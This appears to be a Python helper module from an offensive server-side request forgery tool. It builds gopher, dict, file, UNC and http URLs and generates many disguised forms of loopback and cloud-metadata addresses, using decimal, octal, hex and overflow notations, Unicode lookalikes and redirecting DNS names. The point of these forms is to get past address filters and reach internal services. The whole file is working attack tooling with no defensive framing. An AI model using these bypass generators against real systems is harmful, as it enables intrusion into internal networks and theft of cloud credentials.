import socket
import struct
import string

def wrapper_file(data):
    return "file://{}".format(data)

def wrapper_unc(data, ip):
    return "\\\\{}\\{}".format(ip, data)
    
def wrapper_gopher(data, ip, port):
    return "gopher://{}:{}/_{}".format(ip, port, data)

def wrapper_dict(data, ip, port):
    return "dict://{}:{}/{}".format(ip, port, data)

def wrapper_http(data, ip, port, usernm=False, passwd=False):
    if usernm != False and passwd != False:
        return "http://{}:{}@{}:{}/{}".format(usernm, passwd, ip, port, data)
    return "http://{}:{}/{}".format(ip, port, data)

def wrapper_https(data, ip, port):
    return "https://{}:{}/{}".format(ip, port, data)


def diff_text(text1, text2):
    diff = ""
    for line in text1.split("\n"):
        if not line in text2:
            diff += line + "\n"
    return diff

def ip_default_local(ips, ip):
    ips.add("127.0.0.1")
    ips.add("0.0.0.0")
    ips.add("localhost")

def ip_default_shortcurt(ips, ip):
    ips.add("[::]")
    ips.add("0000::1")
    ips.add("0")
    ips.add("127.1")
    ips.add("127.0.1")

def ip_default_cidr(ips, ip):
    ips.add("127.0.0.0")
    ips.add("127.0.1.3")
    ips.add("127.42.42.42")
    ips.add("127.127.127.127")


def ip_decimal_notation(ips, ip):
    try:
        packedip = socket.inet_aton(ip)
        ips.add(struct.unpack("!l", packedip)[0])
    except:
        pass


def ip_dotted_decimal_with_overflow(ips, ip):
    try:
        ips.add(".".join([str(int(part) + 256) for part in ip.split(".")]))
    except:
        pass


def ip_dotless_decimal(ips, ip):
    def octet_to_decimal_part(ip_part, octet):
        return int(ip_part) * (256 ** octet)

    try:
        parts = [part for part in ip.split(".")]
        ips.add(str(octet_to_decimal_part(parts[0], 3) + octet_to_decimal_part(parts[1], 2) + octet_to_decimal_part(parts[2], 1) + octet_to_decimal_part(parts[3], 0)))
    except:
        pass


def ip_dotted_hexadecimal(ips, ip):
    def octet_to_hex_part(number):
            return str(hex(int(number)))

    try:
        ips.add(".".join([octet_to_hex_part(part) for part in ip.split(".")]))
    except:
        pass


def ip_dotted_octal(ips, ip):
    def octet_to_oct_part(number):
            return str(oct(int(number))).replace("o","")

    try:
        ips.add(".".join([octet_to_oct_part(part) for part in ip.split(".")]))
    except:
        pass


def ip_dotless_decimal_with_overflow(ips, ip):

    def octet_to_decimal_part(ip_part, octet):
        return int(ip_part) * (256 ** octet)

    try:
        parts = [part for part in ip.split(".")]
        ips.add(str(octet_to_decimal_part(parts[0], 3) + octet_to_decimal_part(parts[1], 2) + octet_to_decimal_part(parts[2], 1) + octet_to_decimal_part(parts[3], 0)))
    except:
        pass


def ip_enclosed_alphanumeric(ips, ip):
    intab   = "1234567890abcdefghijklmnopqrstuvwxyz"

    if ip == "127.0.0.1":
        ips.add("ⓛⓞⒸⒶⓛⓣⒺⓢⓣ.ⓜⒺ")

    outtab  = "①②③④⑤⑥⑦⑧⑨⓪ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏ"
    trantab = ip.maketrans(intab, outtab)
    ips.add( ip.translate(trantab) )

    outtab  = "①②③④⑤⑥⑦⑧⑨⓪ⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ"
    trantab = ip.maketrans(intab, outtab)
    ips.add( ip.translate(trantab) )

def ip_dns_redirect(ips, ip):
    if ip == "127.0.0.1":
        ips.add("localtest.me")
        ips.add("customer1.app.localhost.my.company.127.0.0.1.nip.io")
        ips.add("localtest$google.me")

    if ip == "169.254.169.254":
        ips.add("metadata.nicob.net")
        ips.add("169.254.169.254.xip.io")
        ips.add("1ynrnhl.xip.io")

def gen_ip_list(ip, level):
    ips = set()

    if level == 1:
        ips.add(ip)

    if level == 2:
        ip_default_local(ips, ip)
        ip_default_shortcurt(ips, ip)

    if level == 3:
        ip_dns_redirect(ips, ip)
        ip_default_cidr(ips, ip)

    if level == 4:
        ip_decimal_notation(ips, ip)
        ip_enclosed_alphanumeric(ips, ip)

    if level == 5:
        ip_dotted_decimal_with_overflow(ips, ip)
        ip_dotless_decimal(ips, ip)
        ip_dotless_decimal_with_overflow(ips, ip)
        ip_dotted_hexadecimal(ips, ip)
        ip_dotted_octal(ips, ip)

    for ip in ips:
        yield ip